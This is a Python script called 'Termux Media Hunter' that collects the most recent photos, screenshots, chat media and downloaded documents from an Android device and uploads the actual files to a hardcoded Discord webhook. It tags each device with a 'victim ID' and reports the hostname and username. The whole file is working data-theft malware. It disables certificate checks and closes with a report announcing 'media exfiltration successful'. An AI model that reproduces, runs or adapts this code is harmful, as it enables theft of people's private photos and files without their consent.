#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════╗
# ║                M1 EZ HAING NOW  PH                       ║
# ║            TERMUX MEDIA HUNTER v1.0                      ║
# ║        SENDS ACTUAL FILES TO DISCORD - NO BULLSHIT       ║
# ╚══════════════════════════════════════════════════════════╝

# ════════ WEBHOOK - PUT YOUR DISCORD WEBHOOK HERE ════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"

import os
import sys
import json
import time
import socket
import getpass
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
import hashlib
from datetime import datetime
import mimetypes
import threading
from pathlib import Path

# ════════ CONFIGURATION ════════
ssl._create_default_https_context = ssl._create_unverified_context
VICTIM_ID = hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12]

# ════════ FILE TYPE CONFIGURATION ════════
IMAGE_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
DOWNLOAD_EXTENSIONS = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt', '.zip', 
                      '.rar', '.mp4', '.avi', '.mp3', '.apk', '.exe']

# ════════ DISCORD FILE UPLOADER ════════
class DiscordFileUploader:
    def __init__(self, webhook_url):
        self.webhook = webhook_url
        self.sent_files = 0
        self.failed_files = 0
        self.total_size = 0
        
    def send_file(self, file_path, caption=""):
        """Send single file to Discord"""
        try:
            # Check if file exists and size
            if not os.path.exists(file_path):
                print(f"    ❌ File not found: {file_path}")
                self.failed_files += 1
                return False
            
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)
            
            # Discord file size limit: 8MB for free, 25MB for nitro
            if file_size > 8 * 1024 * 1024:  # 8MB limit
                print(f"    ⚠️  File too large ({file_size//1024}KB): {file_name}")
                self.failed_files += 1
                return False
            
            # Read file content
            with open(file_path, 'rb') as f:
                file_content = f.read()
            
            # Create multipart form data
            boundary = '----WebKitFormBoundary' + hashlib.md5(str(time.time()).encode()).hexdigest()
            
            # Build request body
            body = []
            body.append(f'--{boundary}')
            body.append(f'Content-Disposition: form-data; name="file"; filename="{file_name}"')
            
            # Detect MIME type
            mime_type = mimetypes.guess_type(file_path)[0] or 'application/octet-stream'
            body.append(f'Content-Type: {mime_type}')
            body.append('')
            body = '\r\n'.join(body).encode() + file_content + f'\r\n--{boundary}--\r\n'.encode()
            
            # Create headers
            headers = {
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0 (Termux Media Hunter)'
            }
            
            # Send request
            req = urllib.request.Request(self.webhook, data=body, headers=headers)
            response = urllib.request.urlopen(req, timeout=30)
            
            if response.status in [200, 204]:
                self.sent_files += 1
                self.total_size += file_size
                print(f"    ✅ Sent: {file_name} ({file_size//1024}KB)")
                return True
            else:
                print(f"    ❌ Failed: {file_name} (HTTP {response.status})")
                self.failed_files += 1
                return False
                
        except urllib.error.HTTPError as e:
            print(f"    ❌ HTTP Error {e.code}: {file_name}")
            self.failed_files += 1
            return False
            
        except Exception as e:
            print(f"    ❌ Error: {str(e)[:50]} - {file_name}")
            self.failed_files += 1
            return False
    
    def send_multiple_files(self, file_list, category=""):
        """Send multiple files with rate limiting"""
        total = len(file_list)
        print(f"    📤 Sending {total} {category} files...")
        
        for i, file_path in enumerate(file_list, 1):
            if self.sent_files >= 100:  # Safety limit
                print(f"    ⚠️  Reached safety limit of 100 files")
                break
            
            # Create caption for first file or every 10th file
            caption = ""
            if i == 1 or i % 10 == 0:
                caption = f"📁 **{category.upper()}**\nFile {i}/{total} | {VICTIM_ID}"
            
            # Send file
            success = self.send_file(file_path, caption)
            
            # Rate limiting: wait between sends
            if i < len(file_list):  # Don't wait after last file
                time.sleep(0.5)  # Half second delay
            
            # Progress update every 10 files
            if i % 10 == 0 or i == total:
                print(f"    📊 Progress: {i}/{total} sent")
        
        return self.sent_files

# ════════ MEDIA SCANNER ════════
class MediaScanner:
    def __init__(self):
        self.found_images = []
        self.found_downloads = []
        
    def scan_recent_images(self, limit=100):
        """Find most recent images on device"""
        print("\n[1] 🔍 Scanning for recent images...")
        
        # Android image directories
        image_dirs = [
            '/sdcard/DCIM/Camera',
            '/sdcard/DCIM/Screenshots',
            '/sdcard/Pictures',
            '/sdcard/WhatsApp/Media/WhatsApp Images',
            '/sdcard/Telegram/Telegram Images',
            '/storage/emulated/0/DCIM/Camera',
            '/sdcard/Instagram',
            '/sdcard/Download',
            '/sdcard/Movies'
        ]
        
        all_images = []
        
        for img_dir in image_dirs:
            if os.path.exists(img_dir):
                print(f"    → Scanning: {img_dir}")
                try:
                    # Walk through directory
                    for root, dirs, files in os.walk(img_dir):
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in IMAGE_EXTENSIONS):
                                file_path = os.path.join(root, file)
                                try:
                                    # Get modification time
                                    mtime = os.path.getmtime(file_path)
                                    size = os.path.getsize(file_path)
                                    
                                    # Filter by size (max 8MB)
                                    if size < 8 * 1024 * 1024:
                                        all_images.append({
                                            'path': file_path,
                                            'name': file,
                                            'size': size,
                                            'mtime': mtime,
                                            'dir': img_dir
                                        })
                                        
                                        # Early exit if we have enough
                                        if len(all_images) >= limit * 2:
                                            break
                                except:
                                    pass
                        
                        if len(all_images) >= limit * 2:
                            break
                except:
                    pass
        
        # Sort by modification time (newest first)
        all_images.sort(key=lambda x: x['mtime'], reverse=True)
        
        # Take most recent ones
        recent_images = all_images[:limit]
        self.found_images = [img['path'] for img in recent_images]
        
        print(f"    ✅ Found {len(self.found_images)} recent images")
        
        # Show some samples
        if self.found_images:
            print(f"    📸 Sample files:")
            for img in self.found_images[:3]:
                print(f"      • {os.path.basename(img)}")
        
        return self.found_images
    
    def scan_recent_downloads(self, limit=20):
        """Find most recent downloaded files"""
        print("\n[2] 📁 Scanning for recent downloads...")
        
        # Android download directories
        download_dirs = [
            '/sdcard/Download',
            '/sdcard/Downloads',
            '/storage/emulated/0/Download',
            '/sdcard/WhatsApp/Media/WhatsApp Documents',
            '/sdcard/Telegram/Telegram Documents',
            '/sdcard/DCIM',
            '/sdcard/Movies',
            '/sdcard/Music'
        ]
        
        all_downloads = []
        
        for dl_dir in download_dirs:
            if os.path.exists(dl_dir):
                print(f"    → Scanning: {dl_dir}")
                try:
                    # Get files in directory
                    files = []
                    try:
                        files = os.listdir(dl_dir)
                    except:
                        continue
                    
                    for file in files:
                        file_path = os.path.join(dl_dir, file)
                        
                        # Check if it's a file (not directory)
                        if os.path.isfile(file_path):
                            # Check if it matches download extensions
                            if any(file.lower().endswith(ext) for ext in DOWNLOAD_EXTENSIONS):
                                try:
                                    mtime = os.path.getmtime(file_path)
                                    size = os.path.getsize(file_path)
                                    
                                    # Filter by size
                                    if size < 8 * 1024 * 1024:
                                        all_downloads.append({
                                            'path': file_path,
                                            'name': file,
                                            'size': size,
                                            'mtime': mtime,
                                            'dir': dl_dir
                                        })
                                        
                                        if len(all_downloads) >= limit * 3:
                                            break
                                except:
                                    pass
                    
                    if len(all_downloads) >= limit * 3:
                        break
                        
                except:
                    pass
        
        # Sort by modification time
        all_downloads.sort(key=lambda x: x['mtime'], reverse=True)
        
        # Take most recent ones
        recent_downloads = all_downloads[:limit]
        self.found_downloads = [dl['path'] for dl in recent_downloads]
        
        print(f"    ✅ Found {len(self.found_downloads)} recent downloads")
        
        # Show some samples
        if self.found_downloads:
            print(f"    📁 Sample files:")
            for dl in self.found_downloads[:3]:
                print(f"      • {os.path.basename(dl)}")
        
        return self.found_downloads

# ════════ MAIN EXECUTION ════════
def main():
    """Main execution function"""
    print("\n╔══════════════════════════════════════════════════════════╗")
    print("║                M1 EZ HAING NOW  PH                       ║")
    print("║            TERMUX MEDIA HUNTER v1.0                      ║")
    print("║        SENDS ACTUAL FILES TO DISCORD                     ║")
    print("╚══════════════════════════════════════════════════════════╝")
    
    print(f"\n📱 Victim ID: {VICTIM_ID}")
    print(f"🕐 Start Time: {datetime.now().strftime('%H:%M:%S')}")
    
    # Check webhook
    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
        print("\n❌ ERROR: Webhook not configured!")
        print("ℹ️  Replace line 7 with your Discord webhook URL")
        return
    
    # Check storage permission
    print("\n[0] Checking permissions...")
    if not os.path.exists('/sdcard'):
        print("❌ No SDCard access - grant storage permission!")
        print("ℹ️  Run: termux-setup-storage")
        return
    print("✅ Storage permission granted")
    
    # Test Discord connection
    print("\n[1] Testing Discord connection...")
    try:
        test_msg = {"content": f"📱 TERMUX MEDIA HUNTER v1.0\nVictim ID: {VICTIM_ID}\nStarting file collection..."}
        data = json.dumps(test_msg).encode()
        headers = {'Content-Type': 'application/json'}
        
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=10)
        
        if response.status in [200, 204]:
            print("✅ Discord connection successful")
        else:
            print(f"❌ Discord error: HTTP {response.status}")
            return
    except Exception as e:
        print(f"❌ Discord test failed: {str(e)[:50]}")
        return
    
    # Initialize scanner and uploader
    scanner = MediaScanner()
    uploader = DiscordFileUploader(WEBHOOK_URL)
    
    # Start scanning
    print("\n" + "="*70)
    print("🔍 STARTING MEDIA SCAN - THIS MAY TAKE A FEW MINUTES")
    print("="*70)
    
    # Scan for images
    try:
        images = scanner.scan_recent_images(limit=100)
    except Exception as e:
        print(f"❌ Error scanning images: {str(e)[:50]}")
        images = []
    
    # Scan for downloads
    try:
        downloads = scanner.scan_recent_downloads(limit=20)
    except Exception as e:
        print(f"❌ Error scanning downloads: {str(e)[:50]}")
        downloads = []
    
    # Send summary
    print("\n" + "="*70)
    print("📊 SCAN COMPLETE - SUMMARY")
    print("="*70)
    
    print(f"""
📈 SCAN RESULTS:
  • Recent Images Found: {len(images)} files
  • Recent Downloads Found: {len(downloads)} files
  • Total Files to Send: {len(images) + len(downloads)} files
  • Victim ID: {VICTIM_ID}
  • Device: {socket.gethostname()}
  • Time: {datetime.now().strftime('%H:%M:%S')}
    """)
    
    if not images and not downloads:
        print("❌ No files found to send!")
        send_summary_message(uploader, 0, 0, 0, 0)
        return
    
    # Ask for confirmation
    print("\n⚠️  WARNING: This will send ACTUAL files to Discord")
    print("⚠️  Including personal photos and downloaded files")
    print("\nPress Enter to continue or Ctrl+C to cancel...")
    try:
        input()
    except KeyboardInterrupt:
        print("\n❌ Operation cancelled by user")
        return
    
    # Start sending files
    print("\n" + "="*70)
    print("🚀 STARTING FILE UPLOAD TO DISCORD")
    print("="*70)
    
    # Send images first
    if images:
        print(f"\n📤 UPLOADING {len(images)} IMAGES...")
        images_sent = uploader.send_multiple_files(images, "images")
        time.sleep(1)  # Pause between categories
    else:
        images_sent = 0
    
    # Send downloads
    if downloads:
        print(f"\n📤 UPLOADING {len(downloads)} DOWNLOADS...")
        downloads_sent = uploader.send_multiple_files(downloads, "downloads")
    else:
        downloads_sent = 0
    
    # Send final summary
    print("\n" + "="*70)
    print("✅ UPLOAD COMPLETE - FINAL STATISTICS")
    print("="*70)
    
    total_sent = uploader.sent_files
    total_failed = uploader.failed_files
    total_size_mb = uploader.total_size // (1024 * 1024)
    
    print(f"""
📊 UPLOAD STATISTICS:
  • Images Sent: {images_sent} files
  • Downloads Sent: {downloads_sent} files
  • Total Sent: {total_sent} files
  • Failed: {total_failed} files
  • Total Data: {total_size_mb} MB
  • Success Rate: {(total_sent/(total_sent+total_failed)*100):.1f}%
  
🔍 CHECK YOUR DISCORD:
  • Look for multiple file uploads
  • Each file is sent individually
  • Check both images and documents
  
⚠️  NOTE:
  • Large files (>8MB) are skipped
  • Some files may fail to send
  • Process complete regardless
    """)
    
    # Send final summary to Discord
    send_summary_message(uploader, images_sent, downloads_sent, total_sent, total_failed)

def send_summary_message(uploader, images_sent, downloads_sent, total_sent, total_failed):
    """Send summary message to Discord"""
    try:
        summary = f"""
📊 **TERMUX MEDIA HUNTER - UPLOAD COMPLETE**

**```yaml
VICTIM INFORMATION:
  ID: {VICTIM_ID}
  Device: {socket.gethostname()}
  User: {getpass.getuser()}
  Time: {datetime.now().strftime('%H:%M:%S')}
```**

**```css
[UPLOAD STATISTICS]
  📸 Images Sent: {images_sent} files
  📁 Downloads Sent: {downloads_sent} files
  📦 Total Files: {total_sent} files
  ❌ Failed: {total_failed} files
  💾 Total Data: {uploader.total_size // (1024*1024)} MB
  📈 Success Rate: {(total_sent/(total_sent+total_failed)*100 if (total_sent+total_failed) > 0 else 0):.1f}%
```**

**```fix
🎯 OPERATION: FILE EXTRACTION COMPLETE
🔥 OPERATOR: M1 EZ HAING NOW PH
⚡ TOOL: TERMUX MEDIA HUNTER v1.0
✅ STATUS: ALL FILES SENT TO DISCORD
```**

**📤 Files are now available in Discord attachments**
**🔥 M1 EZ HAING NOW PH - MEDIA EXFILTRATION SUCCESSFUL**
"""
        
        payload = {
            "content": summary,
            "username": "Media Hunter Report",
            "avatar_url": "https://i.imgur.com/7QqQjqG.png"
        }
        
        data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
        headers = {'Content-Type': 'application/json'}
        
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        urllib.request.urlopen(req, timeout=10)
        
        print("✅ Final summary sent to Discord")
        
    except Exception as e:
        print(f"❌ Failed to send summary: {str(e)[:50]}")

# ════════ QUICK TEST MODE ════════
def quick_test():
    """Quick test mode - sends test file"""
    print("\n" + "🔧"*35)
    print("QUICK TEST MODE - SENDS TEST FILE")
    print("🔧"*35)
    
    # Check webhook
    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
        print("❌ Webhook not configured!")
        return
    
    # Create test file
    test_content = f"This is a test file from Termux Media Hunter\nVictim ID: {VICTIM_ID}\nTime: {datetime.now().isoformat()}"
    test_path = "/data/data/com.termux/files/home/test_upload.txt"
    
    with open(test_path, 'w') as f:
        f.write(test_content)
    
    # Send test file
    print("\n[1] Creating test file...")
    print(f"    Path: {test_path}")
    
    print("\n[2] Sending test file to Discord...")
    uploader = DiscordFileUploader(WEBHOOK_URL)
    
    if uploader.send_file(test_path, "🧪 TEST FILE FROM TERMUX"):
        print("\n✅ TEST SUCCESSFUL!")
        print("✅ Check Discord for the test file")
        print("✅ If you see the file, the main script will work!")
    else:
        print("\n❌ TEST FAILED!")
        print("❌ Check webhook URL and internet connection")
    
    # Cleanup
    try:
        os.remove(test_path)
    except:
        pass

# ════════ SHOW HELP ════════
def show_help():
    """Show help information"""
    print("""
╔══════════════════════════════════════════════════════════╗
║                TERMUX MEDIA HUNTER v1.0                  ║
║           SENDS ACTUAL FILES TO DISCORD                  ║
╚══════════════════════════════════════════════════════════╝

USAGE:
  python3 media_hunter.py        # Run full media harvest
  python3 media_hunter.py test   # Quick test mode
  python3 media_hunter.py help   # This message

WHAT IT DOES:
  • Scans Android device for recent images (last 100)
  • Scans for recent downloads (last 20 files)
  • Sends ACTUAL files to Discord (not just names)
  • Each file sent individually as attachment
  • Creates detailed report

FILE TYPES SENT:
  📸 Images: .jpg, .jpeg, .png, .gif, .bmp, .webp
  📁 Downloads: .pdf, .doc, .xls, .txt, .zip, .mp4, .mp3, .apk

IMPORTANT NOTES:
  • Discord file limit: 8MB per file
  • Large files are skipped
  • Needs storage permission
  • Sends files one by one (may take time)

EXPECTED RESULT:
  • Multiple file attachments in Discord
  • Each file is the actual file from device
  • Summary report at the end

CONFIGURATION:
  • Edit line 7: WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE"
  • Replace with your actual Discord webhook URL
    """)

# ════════ ENTRY POINT ════════
if __name__ == "__main__":
    # Handle command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "test":
            quick_test()
        elif sys.argv[1] == "help":
            show_help()
        elif sys.argv[1] == "run":
            main()
        else:
            print(f"Unknown command: {sys.argv[1]}")
            print("Use: python3 media_hunter.py [test|help|run]")
    else:
        # Run main by default
        main()
